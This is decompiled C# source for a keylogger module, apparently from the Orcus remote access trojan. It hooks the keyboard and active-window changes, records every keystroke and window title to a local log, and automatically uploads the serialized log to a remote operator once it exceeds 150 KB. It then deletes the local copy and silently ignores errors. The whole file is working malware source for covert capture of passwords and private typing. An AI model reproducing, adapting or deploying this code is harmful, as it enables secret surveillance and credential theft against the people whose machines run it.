using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.NetSerializer;

namespace Orcus.Utilities.KeyLogger;

public class KeyLoggerService : IDisposable
{
	private readonly IDatabaseConnection _databaseConnection;

	private const int MaxLogSize = 153600;

	private ActiveWindowHook _activeWindowHook;

	private KeyboardHook _keyboardHook;

	private KeyLog _keyLog;

	private readonly FileInfo _logFile;

	public KeyLoggerService(IDatabaseConnection databaseConnection)
	{
		_databaseConnection = databaseConnection;
		_logFile = new FileInfo(Consts.KeyLogFile);
	}

	public void Dispose()
	{
		_keyLog.Save();
		_activeWindowHook.Dispose();
		_keyboardHook.Dispose();
	}

	public void Activate()
	{
		_keyLog = KeyLog.Create(_logFile.FullName);
		_keyLog.add_Saved((EventHandler)_keyLog_Saved);
		_keyboardHook = new KeyboardHook();
		_keyboardHook.StringDown += _keyboardHook_StringDown;
		_keyboardHook.StringUp += _keyboardHook_StringUp;
		_keyboardHook.Hook();
		_activeWindowHook = new ActiveWindowHook();
		_activeWindowHook.ActiveWindowChanged += _activeWindowHook_ActiveWindowChanged;
		_activeWindowHook.RaiseOne();
	}

	public bool TryPushKeyLog()
	{
		if (_logFile.Exists && _logFile.Length > 0L)
		{
			_keyLog.Save();
			PushKeyLog(forcePush: true);
			return true;
		}
		return false;
	}

	private void _keyLog_Saved(object sender, EventArgs e)
	{
		CheckSize();
	}

	private void _activeWindowHook_ActiveWindowChanged(object sender, ActiveWindowChangedEventArgs e)
	{
		_keyLog.WindowChanged(e.Title);
	}

	private void _keyboardHook_StringUp(object sender, StringDownEventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		if (!e.IsChar)
		{
			Keys val = (Keys)e.VCode;
			SpecialKeyType val2 = KeysToSpecialKey(val);
			KeyLogEntry val3 = (KeyLogEntry)(((int)val2 == 0) ? new StandardKey((Keys)val, false) : new SpecialKey(val2, false));
			_keyLog.WriteSpecialKey(val3);
		}
	}

	private void _keyboardHook_StringDown(object sender, StringDownEventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		if (e.IsChar)
		{
			_keyLog.WriteString(e.Value);
			return;
		}
		Keys val = (Keys)e.VCode;
		SpecialKeyType val2 = KeysToSpecialKey(val);
		KeyLogEntry val3 = (KeyLogEntry)(((int)val2 == 0) ? new StandardKey((Keys)val, true) : new SpecialKey(val2, true));
		_keyLog.WriteSpecialKey(val3);
	}

	private void CheckSize()
	{
		_logFile.Refresh();
		if (_logFile.Exists && _logFile.Length > 153600L)
		{
			PushKeyLog(forcePush: false);
		}
	}

	private void PushKeyLog(bool forcePush)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		KeyLog val = KeyLog.Parse(_logFile.FullName);
		Serializer val2 = new Serializer((IEnumerable<Type>)new Type[5]
		{
			typeof(List<KeyLogEntry>),
			typeof(NormalText),
			typeof(SpecialKey),
			typeof(StandardKey),
			typeof(WindowChanged)
		});
		try
		{
			_databaseConnection.PushFile(val2.Serialize((object)val.get_LogEntries()), forcePush ? "Requested Key Log" : "Automatic Key Log", DataMode.get_KeyLog());
			_logFile.Delete();
		}
		catch (Exception)
		{
		}
	}

	public static SpecialKeyType KeysToSpecialKey(Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Invalid comparison between Unknown and I4
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Invalid comparison between Unknown and I4
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between Unknown and I4
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		if ((int)key <= 13)
		{
			if ((int)key == 8)
			{
				return (SpecialKeyType)6;
			}
			if ((int)key == 9)
			{
				return (SpecialKeyType)3;
			}
			if ((int)key == 13)
			{
				return (SpecialKeyType)5;
			}
		}
		else if ((int)key <= 92)
		{
			if ((int)key == 20)
			{
				return (SpecialKeyType)4;
			}
			if (key - 91 <= 1)
			{
				return (SpecialKeyType)2;
			}
		}
		else if (key - 160 <= 1 || (int)key == 65536)
		{
			return (SpecialKeyType)1;
		}
		return (SpecialKeyType)0;
	}
}
